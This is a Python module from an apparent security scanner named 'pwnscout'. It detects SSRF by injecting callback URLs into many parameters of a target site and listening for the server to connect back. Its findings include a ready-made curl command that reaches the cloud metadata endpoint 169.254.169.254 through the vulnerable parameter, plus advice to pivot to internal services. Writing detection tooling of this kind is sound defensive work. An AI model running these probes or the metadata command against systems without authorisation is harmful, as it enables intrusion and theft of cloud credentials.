"""Out-of-band SSRF detection.

pwnscout opens its own listener, injects a unique callback URL into URL-ish
parameters, and waits. If the target server fetches our URL, the listener sees
the hit — an out-of-band callback is **zero false-positive** proof of SSRF, and
the connecting IP is the target.

Off by default (`--ssrf`): it opens a local port and relies on the target being
able to reach back, which may be firewalled. Give `--oob-host ip:` when auto
IP detection picks the wrong interface.
"""

from __future__ import annotations

import os
import socket
import socketserver
import threading
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlparse

from ..core.model import Confidence, Finding, Severity
from .session import Session

SSRF_PARAMS = {
    "url", "uri", "link", "src", "source", "target", "dest", "destination",
    "redirect", "redir", "next", "return", "returnurl", "callback", "webhook",
    "feed", "rss", "host", "path", "page", "file", "document", "image",
    "image_url", "img", "avatar", "proxy", "fetch", "load", "remote", "u",
    "continue", "endpoint", "api", "site", "domain", "address", "forward",
    "out", "open", "go", "data", "xml", "json", "resource", "content", "q",
}


class _Handler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            self.request.settimeout(2.0)
            data = self.request.recv(2048)
        except OSError:
            data = b""
        first = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        path = ""
        parts = first.split(" ")
        if len(parts) >= 2 and parts[0].isalpha() and parts[0].isupper():
            path = parts[1]
        self.server.record(self.client_address[0], path, first)  # type: ignore[attr-defined]
        try:
            self.request.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n"
                                 b"Connection: close\r\n\r\nok")
        except OSError:
            pass


class _Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr):
        super().__init__(addr, _Handler)
        self.hits: List[Tuple[str, str, str]] = []
        self._lock = threading.Lock()

    def record(self, peer: str, path: str, raw: str) -> None:
        with self._lock:
            self.hits.append((peer, path, raw))


class OOBListener:
    def __init__(self, bind: str = "0.0.0.0", port: int = 0):
        self.server = _Server((bind, port))
        self.port = self.server.server_address[1]
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        self._thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        try:
            self.server.shutdown()
            self.server.server_close()
        except Exception:
            pass

    def hits(self) -> List[Tuple[str, str, str]]:
        with self.server._lock:
            return list(self.server.hits)


def _local_ip(target_host: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_host, 80))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def _send(session: Session, point, param: str, value: str):
    # allow_redirects=False so an open-redirect endpoint can't make OUR client
    # follow the callback URL and fake an SSRF hit. The target still fetches
    # server-side if it's really vulnerable.
    params = dict(point.params)
    params[param] = value
    if point.method == "POST":
        return session.request(
            point.url, "POST", data=urlencode(params).encode(),
            extra_headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False)
    return session.request(point.url + "?" + urlencode(params), "GET",
                           allow_redirects=False)


def _host_port(url: str):
    p = urlparse(url)
    return (p.hostname or url), (p.port or (443 if p.scheme == "https" else 80))


def run(session: Session, cr, root: str, opts, log=None) -> List[Finding]:
    from .crawler import InjectionPoint

    target_host = urlparse(root).hostname or "127.0.0.1"
    oob_host = getattr(opts, "oob_host", None) or _local_ip(target_host)
    listener = OOBListener(port=int(getattr(opts, "oob_port", 0) or 0))
    if log:
        log(f"    SSRF: OOB listener on {oob_host}:{listener.port}")
    listener.start()

    token_map: Dict[str, Tuple[str, str]] = {}
    candidates: List[Tuple[object, str]] = []
    for p in (cr.points if cr else []):
        for name in p.params:
            candidates.append((p, name))
    # also probe common SSRF params on the base URL, in case none were crawled
    for name in sorted(SSRF_PARAMS):
        candidates.append((InjectionPoint("GET", root, {name: "1"}, "synth"), name))

    budget = int(getattr(opts, "oob_budget", 120))
    injected = 0
    for point, param in candidates[:budget]:
        token = os.urandom(5).hex()
        payload = f"http://{oob_host}:{listener.port}/{token}"
        token_map[token] = (point.url, param)
        try:
            _send(session, point, param, payload)
        except Exception:
            pass
        injected += 1

    time.sleep(float(getattr(opts, "oob_wait", 4.0)))
    hits = listener.hits()
    listener.stop()

    out: List[Finding] = []
    seen = set()
    unattributed = None
    for peer, path, _raw in hits:
        tok = path.strip("/").split("/")[0].split("?")[0] if path else ""
        if tok in token_map and tok not in seen:
            seen.add(tok)
            url, param = token_map[tok]
            host, port = _host_port(url)
            out.append(Finding(
                target=host, port=port, service="http",
                title=f"SSRF confirmed on '{param}' (out-of-band)",
                severity=Severity.HIGH, confidence=Confidence.CONFIRMED,
                verified=True, category="injection",
                evidence=f"OOB callback from {peer} for param '{param}' at {url}",
                why="The server fetched an attacker-supplied URL — an out-of-band "
                    "callback was received. Pivot to internal services, cloud "
                    "metadata (169.254.169.254) and localhost-only admin panels.",
                next_step=f"curl -s '{url}?{param}=http://169.254.169.254/latest/meta-data/'",
                tags=["ssrf"]))
        elif not tok and unattributed is None:
            host, port = _host_port(root)
            unattributed = Finding(
                target=host, port=port, service="http",
                title="SSRF callback received (parameter unattributed)",
                severity=Severity.HIGH, confidence=Confidence.CONFIRMED,
                verified=True, category="injection",
                evidence=f"OOB connection from {peer} during injection (no path echoed)",
                why="A back-connection arrived during SSRF injection but the URL "
                    "path wasn't preserved, so the exact parameter is unknown. "
                    "Re-test parameters individually to pin it down.",
                next_step="# re-run --ssrf per candidate param to attribute",
                tags=["ssrf"])
    if unattributed and not out:
        out.append(unattributed)

    if log:
        log(f"    SSRF: {injected} injected, {len(out)} confirmed")
    return out
